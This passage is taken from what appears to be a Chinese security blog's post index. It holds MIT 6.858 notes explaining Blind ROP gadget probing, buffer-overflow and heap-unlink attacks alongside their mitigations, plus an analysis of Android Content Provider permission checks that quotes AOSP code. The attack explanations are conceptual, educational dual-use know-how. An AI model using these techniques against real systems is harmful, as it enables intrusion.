\\__________| 上面的例子，当 shellcode 生效时，如果 probe 是 popping gadget 即 pop rax；ret; 时，eip 将跳过 trap 来到 stop 地址，否则将 crash。通过多次这样的探测并找出结果是 stop 的，就能找出好多 popping gadgets 了更进一步，对 shellcode 进行变种，能找到更复杂类型的 gadget：比如上面的例子再加一个 trap，就能找到「两次 pop」 的 gadget。到这里，有一点还需要考虑，上面的例子 pop 到寄存器的内容和目标寄存器是未知的，而我们知道 对于 64 bit，参数是用寄存器指示的，这里可以进一步干一些坏事，最终控制系统调用。所以第 3 步：STEP 3. 找到 syscall() 、确定这些 gadgets pop 到的具体是哪一个寄存器pause() 是一个无参数（忽略所有寄存器），为了找到 pause()，攻击者把第二步找到的所有「pop xx; ret」gadgets 链起来，把 pause() 的系统调用号作为「参数」一个个推到寄存器中，链的最后一个放置猜测的 syscall() 地址。这样 shellcode 执行到最后，一大批寄存器都被塞满了「参数」，我们期望包括 rax 寄存器，因为 rax 用于存储 syscall() 的系统调用号参数。这样如果最后猜测的 syscall() 地址命中，就会调用 pause() —— 对攻击者来说这是可以捕获的信号，因为一旦猜错程序会 crash。到这一步，我们知道已经找到 syscall() 的地址了，但是还有一个问题，到底哪个 gadget pop 的是 rax 寄存器？很简单 —— 逐个尝试其中的每一个 gadget，直到命中使得程序 pause()。用同样的模式，利用其它 syscall 我们可以确定任意一个 gadgets 使用的寄存器。最终，上面 shellcode 明确了 syscall 的地址，以及 pop xxx 寄存器的 gadget 的地址，可以用于构造下一步的 shellcode 了。STEP 4. 调用 write()write() 用于向 server 与 攻击者 client 之间的网络 socket 写入数据，要实现此目的需要以下 gadgets：pop rdi; ret //参数1 (socket) pop rsi; ret //参数2 (buffer) pop rdx; ret //参数3 (length)pop rax; ret //系统调用号 (write syscall number)syscall socket fd 很好猜测，因为 Linux 将进程限制为最多 1024 个同时打开的文件描述符，并且新的文件描述符必须是可用的最低值（因此猜测一个小文件描述符在实践中效果很好）。而如果猜对，客户端就会收到消息者。write() 有什么用？攻击者可以将指向程序 .text 段的指针传递给 write，然后就能够读出程序的代码了（之前是地址随机化的，现在则完全暴露了！攻击者不再是 「blind」了），相当于攻击者剥离出了 binary，之后攻击者就可以离线分析二进制，使用 GDB 等工具直接找到更强大的 gadgets，利用这些 gadget是 来打开一个 shell。注：还是那个前提，进程重启随机化信息不变。以上就是 BROP 的基本工作原理，只是基本原理，论文还有大量具体步骤的优化措施。怎么防范 BROP最简单直接，进程 crash 后重新随机化。 —— BROP 之所以能奏效，就是因为没有重新随机化，进程的 crash 可用被用来验证各种推测，具体来说，用 exec 代替 fork 来起新进程（在 Linux exec 是会重新随机化的，在二进制编译时带了 PIE 参数的情况下）；或者用 Windows，因为 Windows 没有 fork，每个新进程都是新的随机化地址空间。此外，课程中一个学生提到一个比较有趣的问题：能不能当进程 crash 的时候保持中 socket 不中断，使得攻击者无法取得有用的信号？教授：实现上是没问题的，要保持 socket 不中断，可以捕获 crash（segfault）信号，并在自定义处理函数中保持 socket 连接。但是这样就把漏洞转换成了 DOS 了，因为这样会产生很多的僵尸进程，这些僵尸进程要保持住，否则又泄露信息了。至于 Bound checking，论文说效率有 2 倍的劣化。" }, { "title": "MIT 6.858 Course 2 - Control Hijacking Attacks", "url": "/posts/mit-6858-course-2-control-hijacking-attacks/", "categories": "MIT 6.858, Course", "tags": "", "date": "2021-11-26 00:00:00 +0800", "snippet": "缓冲区溢出的根本原因？ 系统软件大多是 C 写的，C 速度快、接近硬件…，而 C 暴露 raw memory 且没有边界检查 对 x86 架构的了解：攻击者很清楚栈结构（所以溢出时知道怎么构造假的栈帧）、函数/系统调用约定（Calling Convention）为什么 OS 不主动防止 buffer overflow？因为系统（软件部分）不可能事无巨细、面面俱到，overflow 行为发生在完全属于程序自己的内存空间；而硬件才是会参与、干预每一项细微操作，因此这类问题可以从硬件角度解决。程序如何消除 buffer overflow 漏洞？消除漏洞的意思是，从语言和编程入手，让程序本身无漏洞。措施 1. c 语言要避免写出 bug，甚至避免使用 c对于 c 这种弱类型语言来说，很难区分 bug 非 bug。随着机器、语言的性能越来越好，很多时候仍然坚持使用 c 是没意义的。措施 2. 使用工具来找 bug，包括 静态分析 fuzzingfuzz 本质上是找出隐藏 bug 的分支，普通的功能测试通常无法覆盖所有的分支，静态分析可以和 fuzz 结合（帮助生产 fuzz 用例）void foo(int *p){ int offset; int *z = p + offset; //到这里，静态分析工具会提示有问题，offset 未初始化。 if(offset &amp;gt; 7){ //从静态分析，fuzz 用例可以构造 &amp;lt;7、 =7 、&amp;gt;7 三种情况 bar(offset); }}以上这些方法都无法完全消除安全 bug措施 3. 使用内存安全语言 Python,Java,c#这个方法的局限在于： 有很多历史遗留代码是 c 要在底层操作硬件（驱动程序等等）这个场景需要 c 的好处 性能变差（这些语言面世时无一例外都由解释器解释执行，上而不是直接使用 x86指令。即编译成中间码的高层级指令，然后由一个程序 loop 逐一读入指令并执行，例如 JVM 执行指令就是基于对 stack 的 push pop 操作来模拟这些操作）当然解决办法后面也有出来，比如 JIT 编译就是在运行时编译成 x86 指令需要性能的场景：程序是 CPU bound，CPU速度很重要 不需要性能的场景：程序是 IO bound，大部分时间都是在等待用户输入、硬盘、网络包等等，这些场景实际并不需要高速的原生计算，如果 buffer overflow 不可避免，有什么缓解措施？ buffer overflow 的本质 获取指令指针（IP）的控制权 劫持IP到恶意代码 缓解措施着眼于溢出发生时，阻止攻击者进行以下步骤： 改写代码指针劫持控制流，例如返回地址，函数指针，C++ vtable， 异常处理句柄 在内存中后注入或已存在恶意代码 将恶意代码安置在可预测位置，令代码指针指向该位置缓解措施 1. Stack CanaryCanary 如何防范被攻击者绕过？ 使用 0，CR，LF，-1 等特殊字符（攻击者要用这些字符来 overflow 构造 Canary 时，会让被攻击的函数停止，比如 gets 就是 0），当然对于那些不涉及特殊字符终止的场景，就无效了 使用随机化的 canaryCanary 无法防范的场景？ 指针地址覆盖。因为被践踏的指针地址被代码使用时，并没有 canary 检查，当然如果在每个指针使用前执行检查，那代价昂贵…一个指针覆盖例子：int *ptr = ...;char buf[128];gets(buf); //Buffer is overflowed, and overwrites ptr.*ptr = 5; //Writes to an attacker-controlled address!//Canaries can&#39;t stop this kind of thing.Canary 起作用的条件 overflow 发生后立即执行检查的场景，典型的就是 ret 前检查 buf。在 return 前执行栈检查指令，需要编译器的帮助，以拓展原来的调用约定 —— 原来是 leave 然后 ret，现在就是在 ret 前插入 canary 相关指令。 随机数被猜测 malloc and free 攻击 int main(int argc, char **argv) { char *p, *q; p = malloc(1024); q = malloc(1024); if(argc &amp;gt;= 2) strcpy(p, argv[1]); free(q); free(p); return 0;}+----------------+| || App data || | Allocated memory block+----------------+| size |+----------------++----------------+| size |+----------------+| ...empty... |+----------------+| bkwd ptr |+----------------+| fwd ptr | Free memory block+----------------+| size |+----------------+ 原理是某块 malloc 的空间发生 overflow 后，可以覆盖相邻块空间的 size 字段，这样当堆管理系统 free 这些空间时，由于有两个 free，会将相邻的两块空闲空间合并：p = get_free_block_struct(size);//size 是被控制的，那么 p 也是可以构造的了，也就是下面两个 write 可以被控制来往任意地址写入两个 pointer 长度的数据bck = p-&amp;gt;bk;fwd = p-&amp;gt;fd;fwd-&amp;gt;bk = bck; //Writes memory!bck-&amp;gt;fd = fwd; //Writes memory!（上述过程相当于将空闲 block 的双向链表中某个节点去掉，并重新连通）但实际上如果不精心构造，大部分情况都是非法地址写入，产生段错误。缓解措施 2. 边界检查 总体目标：通过检查指针是否在边界内来阻止指针误用 难点：首先 c 语言里面本来就很难判断一个指针本身（指针类型）是否是合法还是非法，同样是 char * 指针，用来访问 string 类型的 char 数组是没问题的，但是如果该 char 数组是网络数据包，那就不行了（显然要用对应结构体的指针）更典型的是利用联合体指针访问内存对象，根据实际内存的不同，可能 valid 也可能是 invalid造成上述状况的根本原因在于，c 语言中指针本身并不包含使用意图语义。所以，要完全解决是很难的，所以退而求其次，我只要求指针访问的内存，是在边界内即可，具体语义是：指针派生的指针，后者只能解引用属于前者的合法的内存区域即使是退而求其次，也是很有意义的，能够防止内存的随意覆盖：程序只能践踏实际分配的、属于自己的内存。这已经的 c 语言世界里的一大改进了！Electric fences在每个堆对象的边界插一个 guard page，再通过 page tables 来确保对该 page 的访问会立即产生错误。+---------+| Guard || | ^+---------+ | Overflows cause a page exception| Heap | || obj | |+---------+也是一种非常好用的 debugg 技术，只要发生 over flow，立即导致 crash 而不是静悄悄或拖到未来才发现。最大的优点：使用非常方便。无需修改源代码、无需编译器支持，只要修改 malloc 库函数以实现 Electric fences 就行。缺点：耗费空间，特别是存储特别小的堆对象时。所以生产环境很少使用。Fat Pointers思想：修改普通指针，使其除了地址以外，包含首尾边界信息。编译器自动增加额外的代码，使得当访问 fat 指针使其地址更新时，fat 指针的边界也被强制检查+-----------------+| 4-byte address |+-----------------+Fat pointer (96 bits)+-----------------+----------------+---------------------+| 4-byte obj_base | 4-byte obj_end | 4-byte curr_address |+-----------------+----------------+---------------------+缺点1：每次指针解引用前都执行边界检查，是一项昂贵的开支，对于 C 语言这种追求性能的语言来说，更是如此。缺点2：与现成的大量软件不兼容： 现成的库未经修改的话，不接受 fat 指针 包含 fat 指针的数据结构，sizeof 大小会改变（所以，原来哪些使用硬编码数据结构大小的代码，会出问题） fat 指针的更新不是原子化的，而有些程序假设指针写入是原子化的。fat 指针不再是 1 word，而含是多个 word（在 32bit 机器上，32bit 即 1 word 写入是原子化的），其更新操作包含多个步骤。同样的，有令人恶心的副作用，所以生成环境也少用。使用 shadow data structures 来跟踪边界信息 论文：Use shadow data structures to keep track of bounds information (Jones and Kelly, Baggy).基本思想对于每一个分配的对象，同时额外地（使用 shadow data structure）存储该对象的大小信息。举例：存储 malloc 时传递的大小值：char *p = malloc(mem_size);对于大小值是静态的，值由编译器确定：char p[256];然后，对于这样的每个指针，干预两个操作来实现边界检查。 指针运算： char *q = p + 256 指针解引用： char ch = *q;为什么一定要两个操作都干预，只使用某一项不行吗？在指针运算判断的非法指针不一定都是 bug，比如所谓的 “哨兵” 指针（比如数组的最后一项 +1 项），可以用来作为循环终止条件，所以这时候就需要干预解引用了；而指针解引用则是要依赖指针运算阶段获取到 OOB （out of bound）位，没有 OOB 以及当前指针所在的位置，那么解引用时是否越界也就无从判断了。如何实现？挑战 1：怎么存储边界信息呢？即指针地址 -&amp;gt; 边界信息 这个映射关系。效率是一个重要问题。 简单方案 1：使用哈希表或者树，存储映射关系。好处：节省空间（只存使用中的指针，而不是所有可能的指针）；坏处：寻找速度慢（每次查找需要访问多处内存，即使是 Hash 表，也有溢出） 注：Jones and Kelly, Baggy 的论文就提出了一种非常高效的数据结构，来跟踪这些边界信息，使得边界检查变得非常快。 简单方案 2：使用数组来存储每个内存地址的边界信息，速度快但占用内存。 挑战 2：如何强制 OOB 指针解引用失败？ 简单方案：检测每个指针解引用，优点，可行，缺点是很高的内存消耗后面介绍了 宽松边界检查（Baggy Bounds Checking） 的原理，简单说就通过引入一种新的内存分配机制，使得指针边界计算、边界信息存储（通过数组）、边界信息索引变得非常高效，并且利用 VM（虚拟内存）系统自身的内存保护特性，把要解引用的非法指针的关键 bit 设置到非法内存区域，让 paging 硬件报错，这样就不用对解引用采取额外的阻断操作了。" }, { "title": "MIT 6.858 Course 1 - Introduction, Threat Models", "url": "/posts/mit-6858-course-1-introduction-threat-models/", "categories": "MIT 6.858, Course", "tags": "", "date": "2021-11-25 00:00:00 +0800", "snippet": "安全分为 Policy、Threat Model、Mechanism 三部分。Policy 错误例子：Gmail 的密码重置需要辅助邮箱，辅助邮箱提供商的邮箱重置有问题，导致Gmail 不行。Threat Model：对攻击者的假设（assumption）。比如对于web服务器，假设就是攻击者无法物理接触，但可以发送任何规格的数据包。错误例子：在 80 年代 Mit Kerberos 认为 DES 56bit 就是安全的，但是这个假设随着时间很快改变了，还有就是假设 SSL 的所有 CA 都是安全的，然而 CA 上百家，各个国家（中国、印度等等都有）很容易签发任意域名的证书。Mechanism : 让政策和假设得到遵循。错误的例子（相比于 Mechnism 和 Policy 特定于场景，较难分析，机制错误相对容易）： 比如 Apple 的防暴力破解，在 Find my iphone 这个接口就忘记部署了； citi bank 的某个 web 接口没有认证，直接输入 id 就能取到信息； Android 比特币使用 SecureRandom()，然而这个方法其实只是用一个真随机数导入 PRNG 来持续生成随机数，这种方式是 OK 的，但是该 Java 库有 bug，在某些场景忘记使用随机种子，而使用全 0 的种子，这样 PRNG 生成的随机数就能被预测测 浏览器用 c 语言节码 SSL 证书，在读取 string 时以 \\0 中断，这样可以构造 amazon.com\\0.evil.com 的证书来欺骗。缓冲区溢出基础原理课程后半讲了一个最基础的缓冲区溢出实例，并实操演示，是下节课的准备。" }, { "title": "深入探究 Android Content Provider 安全", "url": "/posts/dive-into-android-content-provider-security-implementation/", "categories": "Android", "tags": "", "date": "2021-11-19 00:00:00 +0800", "snippet": "Content Provider 通信模型Android Content Provider 采用 C/S 架构，通信过程可粗略概括为App. A use ContentResolver – to communicates –&amp;gt; ContentProvider implemented by App. B其中，客户端和服务端的通信基于 Binder： 在建立 Binder 通信之前，客户端通过 AMS 获取到服务端的 Binder，具体过程可概括为：客户端从 URI 从提取 CP 的 authorities （CP 的唯一标识），向 AMS 调用 getContentProvider 方法，AMS 收到客户端的 Content Provider 请求后根据 CP 的名称（authorities）向 PMS 查询该 CP 的信息（查询到后会缓存），AMS 根据信息启动 CP 服务端进程，并远程调用 scheduleInstallProvider 通知服务端准备和发布目标 CP，服务端完成 installProvider 后最终反向调用 AMS 的 publishContentProviders 把 CP 注册进来，最后 AMS 再根据条件（权限校验等）把注册进来的 CP 的 Binder 发送给客户端，这样客户端就能和 CP 服务端通信了。参考其中 ContentProvider 是服务端要继承的抽象类，其内部定义了 query、delete 等等抽象方法，须要去实现、重写。此外其通过内部成员变量 mTransport 持有内部类 Transport 对象（负责 Binder IPC 通信）：ContentProvider.javaprivate Transport mTransport = new Transport();...略 /** * Binder object that deals with remoting. * * @hide */ class Transport extends ContentProviderNative {Transport 继承自 ContentProviderNative，而打开 ContentProviderNative 可以看到其继承 Binder 类、实现 IContentProvider 接口，可见是很典型的 Binder 通信模型代码：Transport 是实现 IContentProvider 接口的 Binder 对象，负责处理来自客户端的 Binder 请求以及作为Binder句柄发送给客户端使用。打开 Transport.query()，可以看到先执行了权限检查等逻辑，然后调用 mInterface.query() ，即 ContentProvider 的 query() 、即应用程序的 query() 实现。Content Provider 注册与获取注册 CPPMS 中 的 PackageParser 的 parseProvider 解析 AndroidManifest 中的 CP，生成 ProviderInfo 供后续获使用获取 CPAMS 先初步检查权限（不含 AppOps），如果通过返回 Binder，CP 服务端所在进程的 ContentProvider.java 再二次根据接口类型做最终权限检查和 AppOps 检查。详细见后文。静态 Content Provider 权限可以对 Content Provider 整个（读写一起）配置权限，也可以细粒度地，对Content Provider读写分别配置权限（readPermission、writePermission），甚至针对 path 配置权限，当 Path 权限和 Global 权限同时存在时，前者优先于后者。 参考。此外，Android Framework 不同的 Content Provider 接口执行权限检查情况不同，有的会校验写权限（如 insert），有的会校验读权限，而有的则不校验任何权限，而 getType 是唯一的甚至允许 exported=false 时可被外部调用 的接口，列表如下：   insert delete update query call getStreamTypes bulkInsert getType openFile r opnFile w readPermission no no no yes no no no no yes no writePermission yes yes yes no no no yes no no yes 注意：除了 getType 外，上表中 read/write 权限都不需要的，并不意味着客户端就可以任意访问到，参见Part 1. AMS 对 Content Provider 调用的权限检查。Content Provider 服务要实现只读，可以配置 writePermission 或相应接口实现时 return 0动态 Content Provider 权限根据 [Android 官方描述] (https://developer.android.com/training/articles/security-tips#ContentProviders)，如果应用想动态地授予外部应用 Content Provider 权限（即使该Content Provider 的 exported 属性为 false 或要求了应用不满足的权限），必须在 Provider 的 Manifest 中声明 android:grantUriPermissions 为 true 的属性，使所有 URI 都能够被动态授权，默认为 false；或者仅开放有限的 path 可被动态授权，做法是在其下增加 &amp;lt;grant-uri-permission android:path=&quot;string&quot; android:pathPattern=&quot;string&quot; android:pathPrefix=&quot;string&quot; /&amp;gt;注 1：Android 的 grantUriPermissions 特性要求基于一个 exported=false 的 Content Provider，exported=true 的 Content Provider 外界总是能访问。HMSCore 的 StubContentProvider exported = true，调用 Context().checkUriPermission 试图校验 CP 时，无论先前是否已 grant URI 权限，该接口总是返回有权限。注 2：Android 应用框架会用 ProviderInfo#uriPermissionPatterns 记录 Provider 允许动态授权的 URI 列表，不在此列表的 URI 无法被动态授权；应用可以通过 Context.checkUriPermission() 查询调用者是否被动态授予了目标 URI 的权限。这样一来，Content Provider 就可以通过： 调用 Context.grantPermission() 授予外部应用（指定包名）某个 URI 的访问权限。对应的 revokeUriPermission() 来撤销某个 Uri 的全部访问权限或指定应用的访问权限 （实践中更常用）在发送给外部应用的 Intent 中设置 FLAG_GRANT_READ_URI_PERMISSION/FLAG_GRANT_WRITE_URI_PERMISSION 来授权某个 URI 的访问权限，比如邮件应用临时授予（通过 startActivityForResult）图片浏览应用访问自己的附件图片的权限。 二者差别：前者的授权可以通过参数（toPackage、uri、modeFlags）控制授权者包名、Uri、读写权限组合、授权是否持久化等（默认情况下手机重启或手动 revoke 就会使授权失效）； 后者则仅在接收授权的应用的任务栈（task）存续期间存在，一旦 task 销毁，授权也会自动失效，此时 Content Provider 不需要再手动 revoke。上述权限机制的实现在 ActivityManangerService 里面，其中持久化授权记录在 /data/system/urigrants.xml 文件中; 持久化授权还需要被授权者真实存在，因此要求接收授权者调用 ContentResolver#takePersistableUriPermission(Uri, int) 使持久化授权真实生效。详细参考： Content provider basics Android Security Internals: An In-Depth Guide to Android’s Security ArchitectureContet Provider 权限检查的实现 客户端： ContentResolver、ContextImpl.java、 ActivityThread.java AMS：ActivityManagerService.java、ActivityManager.java 服务端：ContentProvider.javaContent Provider 的权限校验实现分为两部分，第一部分是 AMS 实现的Part 1. AMS 对 Content Provider 调用的权限检查服务端注册调用 AMS.publishContentProviders() 接口注册 CP，使得客户端应用能够通过 CP 名称查询获取到 CP。该接口除了使用 enforceNotIsolatedCaller() 限制沙箱应用调用外（很多接口都有这一限制），没有额外的权限限制，。 /* package */ void enforceNotIsolatedCaller(String caller) { if (UserHandle.isIsolated(Binder.getCallingUid())) { throw new SecurityException(&quot;Isolated process not allowed to call &quot; + caller); } }客户端查询 Conent Provider 时（调用 acquireProvider、…、AMS.getContentProvider） AMS 会调用 PMS 的接口，综合服务端 CP 声明的权限、客户端的权限、服务端 CP exported 情况决定是否返回服务端的 Binder 句柄。具体实现在 AMS.getContentProviderImpl() 中调用 checkContentProviderPermissionLocked /** * Check if {@link ProcessRecord} has a possible chance at accessing the * given {@link ProviderInfo}. Final permission checking is always done * in {@link ContentProvider}. */ private final String checkContentProviderPermissionLocked( ProviderInfo cpi, ProcessRecord r, int userId, boolean checkUser) { // cpi 是服务端 provider 的信息 final int callingPid = (r != null) ? r.pid : Binder.getCallingPid(); final int callingUid = (r != null) ? r.uid : Binder.getCallingUid(); boolean checkedGrants = false; if (checkUser) { // Looking for cross-user grants before enforcing the typical cross-users permissions int tmpTargetUserId = mUserController.unsafeConvertIncomingUser(userId); if (tmpTargetUserId != UserHandle.getUserId(callingUid)) { if (mUgmInternal.checkAuthorityGrants( callingUid, cpi, tmpTargetUserId, checkUser)) { return null; } checkedGrants = true; } userId = mUserController.handleIncomingUser(callingPid, callingUid, userId, false, ALLOW_NON_FULL, &quot;checkContentProviderPermissionLocked &quot; + cpi.authority, null); if (userId != tmpTargetUserId) { // When we actually went to determine the final targer user ID, this ended // up different than our initial check for the authority. This is because // they had asked for USER_CURRENT_OR_SELF and we ended up switching to // SELF. So we need to re-check the grants again. checkedGrants = false; } } // 第一次机会，检查组件级别权限 // 如果组件的 r/w 任意一个权限显式满足或任意一个为 null，就代表客户端有机会访问服务端，返回成功。否则，看下 path 权限有没有机会。 if (checkComponentPermission(cpi.readPermission, callingPid, callingUid, cpi.applicationInfo.uid, cpi.exported) == PackageManager.PERMISSION_GRANTED) { return null; } if (checkComponentPermission(cpi.writePermission, callingPid, callingUid, cpi.applicationInfo.uid, cpi.exported) == PackageManager.PERMISSION_GRANTED) { return null; } // 第二次机会，path 权限 PathPermission[] pps = cpi.pathPermissions; if (pps != null) { int i = pps.length; // 将所有 path 的 readPermission writePermission 权限都检查一遍，只要有任意一个权限显式满足（且 path 权限非 null），则返回成功。否则下一步。这里 path 权限为 null 时，并不视为「机会」，当组件权限显式拒绝时，这才是合理的。 while (i &amp;gt; 0) { i--; PathPermission pp = pps[i]; String pprperm = pp.getReadPermission(); if (pprperm != null &amp;amp;&amp;amp; checkComponentPermission(pprperm, callingPid, callingUid, cpi.applicationInfo.uid, cpi.exported) == PackageManager.PERMISSION_GRANTED) { return null; } String ppwperm = pp.getWritePermission(); if (ppwperm != null &amp;amp;&amp;amp; checkComponentPermission(ppwperm, callingPid, callingUid, cpi.applicationInfo.uid, cpi.exported) == PackageManager.PERMISSION_GRANTED) { return null; } } } // 最后一个机会：检查 grant uri，看该客户端是否被服务端 grant uri 过 if (!checkedGrants &amp;amp;&amp;amp; mUgmInternal.checkAuthorityGrants(callingUid, cpi, userId, checkUser)) { return null; } final String suffix; if (!cpi.exported) { suffix = &quot; that is not exported from UID &quot; + cpi.applicationInfo.uid; } else if (android.Manifest.permission.MANAGE_DOCUMENTS.equals(cpi.readPermission)) { suffix = &quot; requires that you obtain access using ACTION_OPEN_DOCUMENT or related APIs&quot;; } else { suffix = &quot; requires &quot; + cpi.readPermission + &quot; or &quot; + cpi.writePermission; } final String msg = &quot;Permission Denial: opening provider &quot; + cpi.name + &quot; from &quot; + (r != null ? r : &quot;(null)&quot;) + &quot; (pid=&quot; + callingPid + &quot;, uid=&quot; + callingUid + &quot;)&quot; + suffix; Slog.w(TAG, msg); return msg; }其中入参 permission 是目标组件声明的权限，owningUid 是目标组件应用的 UID， exported 是目标组件的暴露情况，uid 是调用者的 UID。这里和 AMS/PMS 所有权限检查代码一样，只检查传统权限模型中的 Permission，而不检查 App Ops。checkContentProviderPermissionLocked 的逻辑总的来说是：只要调用者有任何访问 CP 的机会就返回成功，允许将服务端的 Binder 发送给客户端（正如方法开头的注释所说，当然服务端还有下半场权限检查），具体来说： 默认无访问权限，依次检查下列权限规则，当任意「机会」存在时返回权限检查成功（意味着 AMS 将返回 CP 服务端的 Binder 给到客户端应用） 检查跨（多）用户的权限，这里省略。 服务端组件并不要求权限或客户端显式具有服务端 ContentProvider 组件维度声明的权限，视为有「机会」。否则下一步。 如果组件的 r/w 任意一个权限显式满足或任意一个为 null，就代表客户端有机会访问服务端，返回成功。—— 类比于一套房子的若干大门，和内部的房间门，当任意大门是开的（权限 null 或者显式满足），一定是有机会进入房子 分别调用 checkComponentPermission()，先后检查客户端是否具有服务端件声明的 readPermission 和 writePermission 权限，检查客户端是否 PERMISSION_GRANTED。 注意：这里 AMS 对组件级的权限检查并不直接检查 ContentProvider 清单文件中声明的 permission 属性 (整体权限)。实际上，AMS 内记录实例权限信息的 ProviderInfo 类也不存在对应于清单中 permission 属性的字段，这是因为 PackageParser.parseProvider() 解析 ContentProvider 组件时，权限信息会拍扁为 ProviderInfo.readPermission 和 ProviderInfo.readPermission，其取值遵循清单文件中 ContentProvider r/w 权限优先于组件权限的原则：当清单中 r、w 非空时，取 r、w 的值；当 r 或 w 为空无法取到值时，对应地以 permission 的值为准（包括空，即最终取值 null）。参考文档 provider-element checkComponentPermission 的实现在 ActivityManager.checkComponentPermission() ，会检查 exported 和权限拥有情况（其中权权限检查是调用 PMS 的接口）。当 exported = false 时直接返回失败，exported = true 时才检查权限，并且如下代码可以验证：当服务端声明的权限为 null 时返回 PERMISSION_GRANTED，即无权限保护时即可访问 ContentProvider（准确说还只是获取 Binder 句柄）。 if (permission == null) { //服务端权限，这边是 readPermission 或 writePermission return PackageManager.PERMISSION_GRANTED; } 客户端显式具有服务端 pathPermissions 声明的权限的集合中任意一个，则视为有「机会」。—— 虽然大门是紧闭的，但只要有开窗，还是有机会进入房子，当然空 path 权限等价于没有窗户。 组件粒度权限检查失败，开始检查 pathPermission。pathPermission 是针对单个 path 设置的权限，但 AMS 的检查并不看具体的 URI ，只要客户端具有任意一个权限即可（针对 URI 的检查，放在 ContentProvider.java）。还是使用 checkComponentPermission ，因此检查结果仍然包含 exported 属性。如果检查成功则返回成功，否则下一步。 注意：到这一步，空 pathpermission 不能像空组件权限一样视为机会了。 检查 grant uri，看该客户端是否被服务端 grant uri 过，如果满足，则给最后一次「机会」。 pathPermissions 也检查失败，还有机会，检查客户端是否被服务端 grant uri 过，只要 grant 过即返回成功，不管是什么 URI。 if (!checkedGrants &amp;amp;&amp;amp; mUgmInternal.checkAuthorityGrants(callingUid, cpi, userId, checkUser)) { return null; } 逻辑是：检查 callingUid 所有的 granted 权限的 URI 中，是否有任意一个 URI 其 content provider Authority（通过 uri.getAuthority() 获取） 能匹配目标 content provider，如果匹配说明这个 callingUid 被目标 cp grant 过。如果匹配则返回成功。否则下一步（到这里就是失败了）。这里也是为什么 exported 为 false 的 cp 认然有机会被访问的原因。上述权限检查逻辑似乎哪里不对：Content Provider 不同接口权限要求是不一样的，比如 query 和 insert 一个是要求符合 readPermission，而 insert 则是 writePermission，而且也没有针对具体的 URI 做区分。原来这里 AMS 只是决定 Binder 句柄是否返回给客户端，只是表示客户端可能具有权限，客户端获取到 Binder 句柄建立通信后，在服务端进程运行的 Android 应用框架 ContentProvider 类还会执行决定性的权限检查。对于任何一个权限都不具有不沾边的，就直接拒绝了。在一开始的注释也有说明。part2. ContentProvider.java 对调用的检查ContentProvider.java 是运行在服务端应用程序的应用框架类，通过 part1 的权限检查后，客户端会得到建立通信的 Binder 句柄，而 ContentProvider.java 这里会执行最终的权限检查。和 part1 相比，权限检查很相似。但一个大差别是 AMS 是更宽松的，当组件级权限是空的情况直接允许（这条件返回 CP Binder 给客户端没毛病），而 ContentProvider.java 则严格，当组件级权限为空，path 权限也要为空这才 OK。不同接口不同权限检查要求参考 Content Provider 通信机制，这部分权限检查是由 ContentProvider 内部持有的 Binder 接口实现类（Transport）中执行的，只有 Transport 执行权限校验后才会调用服务端实现的 ContentProvider 业务抽象方法（query、delete等等）。而 readPermission/writePermission/pathPermission 权限执行在不同的 ContentProvider 业务方法中不同。举例来说： Transport.query() if (enforceReadPermission(callingPkg, uri, null) != AppOpsManager.MODE_ALLOWED) {说明 query() 会校验读权限。 Transport.insertif (enforceWritePermission(callingPkg, uri, null) != AppOpsManager.MODE_ALLOWED) {而 insert() 会校验写权限。 getTypegetType 不会校验权限。拓展：实际上 getType() 不仅不会执行权限校验，而且服务端组件 exported=false 时仍能被外部调用，这是因为 AMS 特别地开了小门，单独对 getProviderMimeType 进行了实现： getProviderMimeType完整方法对应的权限要求参见后表。权限检查接口实现enforceReadPermission/enforceWritePermission() 的主要实现在 enforceReadPermissionInner()/enforceWritePermissionInner()ContentProvider.java protected int enforceWritePermissionInner(Uri uri, String callingPkg, IBinder callerToken) throws SecurityException { final Context context = getContext(); final int pid = Binder.getCallingPid(); final int uid = Binder.getCallingUid(); String missingPerm = null; int strongestMode = MODE_ALLOWED; if (UserHandle.isSameApp(uid, mMyUid)) { return MODE_ALLOWED; } // 如果 exported=true，好，来看看权限有满足的情况不。 if (mExported &amp;amp;&amp;amp; checkUser(pid, uid, context)) { final String componentPerm = getWritePermission(); // 权限显式满足（非空且客户端匹配权限），ALLOW！,否则再看看 path 权限，有没有机会。 if (componentPerm != null) { final int mode = checkPermissionAndAppOp(componentPerm, callingPkg, callerToken); if (mode == MODE_ALLOWED) { return MODE_ALLOWED; } else { missingPerm = componentPerm; strongestMode = Math.max(strongestMode, mode); } } // path 权限显式满足，ALLOW！； // path 权限为空，且组件权限也为空，说明 CP 没有安全要求，ALLOW！。否则再看看动态 URI 权限有没有权限。 // track if unprotected write is allowed; any denied // &amp;lt;path-permission&amp;gt; below removes this ability boolean allowDefaultWrite = (componentPerm == null); final PathPermission[] pps = getPathPermissions(); if (pps != null) { final String path = uri.getPath(); for (PathPermission pp : pps) { final String pathPerm = pp.getWritePermission(); if (pathPerm != null &amp;amp;&amp;amp; pp.match(path)) { final int mode = checkPermissionAndAppOp(pathPerm, callingPkg, callerToken); if (mode == MODE_ALLOWED) { return MODE_ALLOWED; } else { // any denied &amp;lt;path-permission&amp;gt; means we lose // default &amp;lt;provider&amp;gt; access. allowDefaultWrite = false; missingPerm = pathPerm; strongestMode = Math.max(strongestMode, mode); } } } } // if we passed &amp;lt;path-permission&amp;gt; checks above, and no default // &amp;lt;provider&amp;gt; permission, then allow access. if (allowDefaultWrite) return MODE_ALLOWED; } // exported 为 false？没关系，最后一次机会，动态 URI 授权。 // last chance, check against any uri grants if (context.checkUriPermission(uri, pid, uid, Intent.FLAG_GRANT_WRITE_URI_PERMISSION, callerToken) == PERMISSION_GRANTED) { return MODE_ALLOWED; } // If the worst denial we found above was ignored, then pass that // ignored through; otherwise we assume it should be a real error below. if (strongestMode == MODE_IGNORED) { return MODE_IGNORED; } final String failReason = mExported ? &quot; requires &quot; + missingPerm + &quot;, or grantUriPermission()&quot; : &quot; requires the provider be exported, or grantUriPermission()&quot;; throw new SecurityException(&quot;Permission Denial: writing &quot; + ContentProvider.this.getClass().getName() + &quot; uri &quot; + uri + &quot; from pid=&quot; + pid + &quot;, uid=&quot; + uid + failReason); }对于每个客户端的请求，StubContentProvider 都会做权限和 AppOps 检查，检查失败时要拒绝访问。检查遵照如下逻辑： 默认禁止调用者访问（权限检查是失败），但调用者有以下若干机会获得允许。按顺序排查，当某当任意条件检查显示客户端具有权限时返回检查成功。 检查请求是否来自同一个 UID，如果相同检查成功。 检查组件是否对外暴露（ exported 属性），如果对外暴露，执行下一步的权限以及关联的 AppOps 检查，如果不对外暴露进入 5 